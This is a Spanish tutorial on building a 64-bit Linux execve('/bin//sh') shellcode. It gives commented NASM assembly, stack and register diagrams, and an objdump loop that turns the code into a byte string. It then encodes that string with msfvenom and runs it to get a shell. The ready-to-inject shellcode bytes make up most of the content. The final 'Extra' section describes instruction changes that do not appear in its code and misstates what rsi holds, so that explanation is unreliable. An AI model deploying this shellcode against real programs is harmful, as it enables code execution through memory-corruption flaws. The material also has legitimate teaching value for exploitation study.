## Bin/bash shellcode

El shellcode es una cadena de bytes en código máquina directamente ejecutado en la CPU.
Se suele introducir en el stack (parte de la memoria de un programa) mediante alguna falla de buffer overflow.

Para el shellcode, entramos en lo que se llama "Modo kernel" gracias a un tipo de funciones llamado "syscalls" que le dan el control 
del sistema al kernel durante la ejecución para hacer operaciónes mas privilegiadas. Estas funciones syscall como write() son en las que se 
basan las funciones de c como printf() al compilarse.

Hay un archivo en Linux bajo la ruta `/usr/include/x86_64-linux-gnu/asm/unistd_64.h` (en este caso 64 bits) donde están los indices de las funciones.
En este caso usaremos el 59 que es sys_execv. (Ej el 1 es write y el 60 es exit)

-----------------------

La programación en código máquina se basa en pasarle al registro rax el índice de la funcion syscall que queremos (en nuestro caso 59 para execv)
y en los registros rdi, rsi y rdx (por orden), los argumentos de esta función.

Si miramos el [manual de Linux](https://man7.org/linux/man-pages/man2/execve.2.html) vemos que execve nos pide tres argumentos:
`int execve(const char *pathname, char *const argv[], char *const envp[]);`
- **Path del binario a ejecutar** en este caso /bin/sh, que redondearemos a 8 bytes quedando /bin//sh (igualmente funcional), esto ira a RDI.
- **Argumentos**, en este caso no tenemos, sino que hay que poner la direccion del binario. A RSI
- **Variables de entorno**: no tenemos asi que sera "0". A RDX

Tanto lo que va en rdi como en rsi, como son cadenas de texto, hay que acabarlas en nulls (Ceros basicamente)
Es decir `execve(/bin/sh0x0, &/bin/sh, 0x000000000000000}`
Lo que haremos es meter esos argumentos en la memoria (rsp) y luego pasarlo de ahi a los registros.

-------------------------

Para pasar el "/bin//bash", hay que pasarlo a hexadecimal. Eso se puede hacer facilmente con Python:
`"0x" + "/bin//sh"[::-1].encode("utf-8").hex() -> 0x68732f2f6e69622f `

Codigo en assembly:
```asm
global _start 
section .text
_start:
    xor rax, rax ; primer null , rax=0 ; de RAX sacamos los Ceros
    push rax ; rsp = 0x000000000000000. 

    mov rbx, 0x68732f2f6e69622f ; /bin//sh (8 bytes, o sea, alineado)
    push rbx ; rsp:  0x68732f2f6e69622f    0x000000000000000. -> Ahora la pila tiene el primer argumento (/bin//sh, 0x0)
    mov rdi, rsp ; rdi 0x68732f2f6e69622f /bin//sh -> Esto de la pila lo metemos en rdi como primer argumento

    push rax ;           otro null; rsp  0x000000000000000  0x68732f2f6e69622f   0x000000000000000
    mov rdx, rsp ;       rdx = 0x000000000000000 (Tercer argumento)

    push rdi ;          dirección de /bin/sh en la pila ->  rsp 0x00007fffffffdeb0  0x000000000000000 0x68732f2f6e69622f  0x000000000000000
    mov rsi, rsp          ; rsi -> 0x7fffffffdea0  (0x68732f2f6e69622f en el stack)

    add rax, 59 ;       Llamamos a execve
    syscall  ; lo ejecutamos
```
Para que entendamos como está puesto todo:  
- La pila  
```
| rsp   |    0x7fffffffdea0  | 0x7fffffffdea8     | 0x7fffffffdeb0               |    0x7fffffffdeb8 |
| ---   | ------------------ | ------------------ | ---------------------------- | ----------------- |
| valor | 0x00007fffffffdeb0 |  0x000000000000000 | 0x68732f2f6e69622f (/bin//sh)| 0x000000000000000 | 
```
- Los registros:
```
  ; $rdi   : 0x007fffffffdeb0  →  "/bin//sh",0x0
  ; $rsi   : 0x007fffffffdea0  →  0x007fffffffdeb0  →  "/bin//sh"
  ; $rdx   : 0x007fffffffdea8  →  0x0000000000000000
```

------------------

Compilamos esto a un objeto y lo pasamos a una cadena de bytes.
```bash
└─$ nasm -f elf64 execv.asm -o execv.o
└─$ ld execv.o -o execv
└─$ ./execv
$ whoami
cucuxii
```

```bash
└─$ for i in $(objdump -d execv.o -M intel | grep "^ " | cut -f2); do echo -n "\\\x$i"; done                  
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
└─$ echo -ne "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05" | msfvenom -f elf -e x64/xor -a x64 --platform linux > demo
└─$ ./demo
$ whoami
cucuxii
```
--------------------

## Extra: Otra version que funciona

```
global _start 
section .text

_start:
    xor rax, rax 
    push rax                    ; Colocar NULL en la pila
    mov rbx, 0x68732f2f6e69622f ; rbx = /bin//sh
    push rbx                    ; Meter "/bin//sh" en la pila
    mov rdi, rsp                ; Colocar la dirección de "/bin//sh" en rdi
    
    push rax                    ; Meter un 0x0 (NULL) en la pila
    mov rdx, rsp                ; Colocar NULL en rdx
    
    push rdi                    ; Colocar puntero a "/bin//sh" en la pila
    mov rsi, rsp                ; Meter el puntero en rsi
    
    add rax, 59                 ; Cargar el número de la llamada al sistema de execve en rax (59)
    syscall                     ; Realizar la llamada al sistema
```
- mov rdi, rsp se ha cambiado a mov rsi, rsp. Ahora, la dirección de /bin//sh se carga en rsi en lugar de rdi.
- mov rdx, rsp se ha cambiado a mov rax, rsp. Ahora, NULL se carga en rax en lugar de rdx.
- mov rsi, rsp se ha cambiado a mov rdi, rsp. Ahora, la dirección de /bin//sh se carga en rdi en lugar de rsi.

La razón por la que esto funciona es que la llamada al sistema execve toma los siguientes argumentos en los registros:

- rax: El número de la llamada al sistema.
- rdi: El primer argumento (en este caso, la dirección de la cadena /bin//sh).
- rsi: El segundo argumento (en este caso, NULL).
- rdx: El tercer argumento (en este caso, NULL).
